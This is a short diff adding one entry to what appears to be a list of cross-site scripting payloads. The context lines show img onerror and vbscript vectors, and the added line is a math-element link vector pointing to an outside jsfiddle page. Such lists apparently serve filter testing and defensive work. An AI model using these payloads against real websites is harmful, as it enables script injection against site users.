@@ -105,3 +105,5 @@ tags:
 <img src=\`%00\`&NewLine; onerror=alert(1)&NewLine;
 
 <IMG SRC='vbscript:msgbox("XSS")'>
+
+<math><a xlink:href="//jsfiddle.net/t846h/">click
